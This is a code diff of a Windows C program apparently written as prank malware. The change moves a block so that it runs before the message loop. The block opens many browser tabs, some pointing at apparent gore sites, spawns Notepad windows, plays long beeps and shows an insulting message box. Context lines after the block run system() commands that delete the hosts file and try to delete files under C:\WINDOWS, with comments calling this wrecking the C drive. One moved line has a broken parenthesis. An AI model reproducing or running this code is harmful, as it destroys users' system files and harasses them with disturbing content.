@@ -73,13 +73,32 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
        ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
        Beep(400,8000);
 
+       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe", "https://safeweb.norton.com/404",NULL,SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe","https://goregrish.com",NULL,SW_SHOWMAXIMIZED);
+       ShellExecute(NULL,"open","msedge.exe","https://reelleak.com",NULL,SW_SHOWMAXIMIZED);
+        ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
 
+                ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
+       MessageBeep(MB_ICONINFORMATION);
+       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
+       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/p/CyOy0JzvKvm/?igsh=MWo0amppYjRjeTFkZQ==",NULL,SW_SHOWMAXIMIZED);
+     MessageBox(NULL, TEXT("You are a Stupid like everyone !!",
+ NULL, MB_ICONERROR);
 
-
+    Beep(800,8000);
+ Beep(900,9000);
+ Beep(1000,10000);
+ Beep(1100,11000);
 
 
     
-
        WNDCLASSW ws = {0};
 
     ws.lpszClassName = L"MY_WINDOW";
@@ -124,40 +143,7 @@ while (GetMessageW(&msg,NULL,0,0))
     TranslateMessage (&msg);
     DispatchMessage(&msg);
 }
-
-
-
-
-
-
-
-
-
     
-    
-       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
-       ShellExecute(NULL,"open","msedge.exe", "https://safeweb.norton.com/404",NULL,SW_NORMAL);
-       ShellExecute(NULL,"open","msedge.exe","https://goregrish.com",NULL,SW_SHOWMAXIMIZED);
-       ShellExecute(NULL,"open","msedge.exe","https://reelleak.com",NULL,SW_SHOWMAXIMIZED);
-        ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-
-                ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
-       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
-       MessageBeep(MB_ICONINFORMATION);
-       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
-       ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
-       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
-       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/p/CyOy0JzvKvm/?igsh=MWo0amppYjRjeTFkZQ==",NULL,SW_SHOWMAXIMIZED);
-     MessageBox(NULL, TEXT("You are a Stupid like everyone !!"),
- NULL, MB_ICONERROR);
-
-    Beep(800,8000);
- Beep(900,9000);
- Beep(1000,10000);
- Beep(1100,11000);
        system("del C:\WINDOWS\System32\drivers\etc\hosts");// deleting the host files of C directory in sense of malfunction 
     system("del C:\\WINDOWS\\.");//Now fire up the C drive  
 
